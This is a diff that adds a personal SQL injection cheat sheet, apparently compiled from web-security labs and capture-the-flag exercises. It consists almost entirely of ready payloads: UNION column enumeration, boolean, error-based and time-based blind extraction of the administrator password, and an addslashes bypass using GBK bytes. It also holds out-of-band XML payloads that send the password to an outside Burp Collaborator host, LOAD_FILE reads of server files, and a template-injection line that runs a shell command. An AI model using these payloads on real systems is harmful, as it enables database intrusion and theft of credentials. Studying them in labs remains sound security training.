@@ -1,0 +1,252 @@
+
+administrator'--
+
+UNION INJECTION
+' ORDER BY 1--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL,NULL--
+If the number of nulls does not match the number of columns, the database returns an error
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL,+NULL,+NULL--
+' UNION SELECT NULL FROM DUAL-- For Oracle database
+
+Finding columns with a useful data type in an SQL injection UNION attack
+' UNION SELECT 'a',NULL,NULL,NULL--
+' UNION SELECT NULL,'a',NULL,NULL--
+' UNION SELECT NULL,NULL,'a',NULL--
+' UNION SELECT NULL,NULL,NULL,'a'-- 
+
+If the column is not compatible with string it my return this error
+Conversion failed when converting the varchar value 'a' to data type int. 
+ ' UNION SELECT username, password FROM users--
+
+' UNION+SELECT+username,password+FROM+users--
+
+' UNION SELECT @@version--  MYSQL
+
+Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'#
+
+'+UNION+SELECT+@@version,+NULL#
+
+ 	SELECT version()  --PostgreSQL
+ 	SELECT * FROM v$version  --Oracle
+SELECT 'abc' FROM dual
+Use the following payload to display the database version: '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+ 
+                Retrieving content from database
+SELECT * FROM information_schema.tables 
+
+SELECT * FROM information_schema.columns WHERE table_name = 'Users' 
+
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
+
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
+
+'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
+
+category=Gifts'UNION+SELECT+table_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_cefiop'--
+
+category=Gifts'UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_cefiop'--
+
+                 List Database information on Oracle
+You can list tables by querying all_tables: 
+SELECT * FROM all_tables 
+
+ And you can list columns by querying all_tab_columns:
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS' 
+
+category=Tech+gifts'UNION+SELECT+'all_tables',+NULL+FROM+all--
+
+
+                                Blind SQL INJECTION-Conditional response
+ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
+
+We can continue this process to systematically determine the full password for the Administrator user. 
+
+
+ xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+
+This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t
+
+and (select+'x'+from+users+LIMIT+1)='x'--'
+
+and(select+username+from+users+where+username='administrator')='administrator'--'
+
+(select+username+from+users+where+username='administrator'+and+LENGTH(password)>1)='administrator'--'
+
+(select+substring(password,1,1)+from+users+where+username='administrator')='a'--'
+
+TrackingId=xyz' AND '1'='1
+
+TrackingId=xyz' AND '1'='2
+
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+ TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'--
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
+
+TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--
+
+                            Condition Errror
+ xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a 
+
+TrackingId=xyz'||(SELECT '')||'  comfirm that the server is interpreting or processing the injection as an SQL query
+
+'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
+
+ Note that the WHERE ROWNUM = 1 condition is important here to prevent the query from returning more than one row, which would break our concatenation. 
+
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+The above statement will course an error
+
+'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
+On the above statement error will dissapper
+
+You can use this behavior to test whether specific entries exist in a table. For example, use the following query to check whether the username administrator exists: 
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'. 
+
+Verify that the condition is true (the error is received), confirming that there is a user called administrator
+
+The next step is to determine how many characters are in the password of the administrator user. To do this, change the value to: 
+
+
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'.
+
+ This condition should be true, confirming that the password is greater than 1 character in length. 
+
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+
+                         TRIGERRING TIME DELEAY
+           For Microsoft database
+'; IF (1=2) WAITFOR DELAY '0:0:10'--
+'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
+
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 
+'||(SELECT pg_sleep(10) )||--
+' || pg_sleep(10)--
+
+           Verify that the database takes ten second to respond
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--.
+
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
+
+    Verify tha there is user called admin
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+      Verifyy that how many character are in admin password using
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+
+
+       SQL Injection out-of-band vulnerability 
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "c1eiuyom2midprnceylzji41isorcg.burpcollaborator.net"> %remote;]>'),'/l') FROM dual)--
+
+' || (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.f6my8t35a72iaeyv6i9f52vmddj37s.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+
+et?id=1.1UNION SELECT 1,2,3--
+/ticket?id=1 AND 1=1
+et?id=1 AND 1=1 ORDER BY 3--
+ticket?id=1.1 UNION SELECT VERSION(),DATABASE(),3--
+
+?id=1.1 UNION SELECT 1,GROUP_CONCAT(TABLE_NAME),3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()--
+
+ticket?id=1.1 UNION SELECT 1,GROUP_CONCAT(COLUMN_NAME),3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='users'--
+
+ticket?id=1.1 UNION SELECT 1,password,3 FROM users WHERE username='admin'--
+
+    GBK
+login[]=-&password=gfgf
+"md5() expects parameter 1 to be string, array given in OR  addslashes() expects parameter 1 to be string, array given in"
+
+It seems that the addslashes function is used in the login field and md5 in the password field. Scenario like this, just pay attention to bypass addslashes in the login field. 
+
+
+The addslashes bypass scene for this scenario reads like this. The "\" when encode will be "%5c" and we need to add a special symbol so that when linking with "%5c" it will become another symbol that is not filtered by the server
+
+ there are a few solution tricks that only use %af and %bf =..=
+
+
+              SQLITE
+select sqlite_version()
+SELECT tbl_name FROM sqlite_master
+SELECT sql FROM sqlite_master
+admin%af'+or+1=1#
+admin%af'+or+1=1-- - (af,bf)
+' UNION SELECT '{{config.__class__.__init__.__globals__["os"].popen("cat flag2.txt").read()}}'-- --- --- -
+
+' UNION SELECT flag FROM flags-- --- --- -
+q'UNION SELECT 1,2--
+
+'union select group_concat(schema_name) from information_schema.schemata-- -
+'union select group_concat(table_name,column_name) from information_schema.columns where table_schema like 'november'-- -
+
+df'union select group_concat(table_name,":",column_name,"\n") from information_schema.columns where table_schema like 'november'-- -
+
+df'union select group_concat(player,"\n") from november.players-- -
+
+df'union select LOAD_FILE('/var/www/html/index.php')-- -
+
+select * from users LIMIT 1;
+"LIMIT 1,1" forces the query to skip the first result, and then "LIMIT 2,1" skips the first two results, and so on. You need to remember the first number tells the database how many results you wish to skip, and the second number tells the database how many rows to return.
+
+select * from users where username like 'a%';
+
+select * from users where username like '%mi%';
+This returns any rows with a username containing the characters mi within them.
+
+SELECT * from blog where id=1 and private=0 LIMIT 1;
+private column set to 0, which means it's able to be viewed by the public and limits the results to only one match.
+
+-------------------------------------------------------------------------------------------------------------------
+0 UNION SELECT 1,2,database()
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+
+0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+' OR 1=1;--
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+     Boolean
+admin123' UNION SELECT 1,2,3;--
+
+admin123' UNION SELECT 1,2,3 where database() like '%';--
+
+admin123' UNION SELECT 1,2,3 where database() like 's%';--
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
+
+admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+--------------------------------------------------------------------------------------------------------------------------
+    Time-based
+' UNION SELECT SLEEP(5);--
+' UNION SELECT SLEEP(5),2;--
+admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
+
+admin123' UNION SELECT SLEEP(5),2 from users where username = 'admin' and password like '4%';--
+
+' or 1=1-- 
+admin@juice-sh.op'--
+
+Select user,password from mysql.user;  
+
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+
+
+
+
+
+
+
+
+
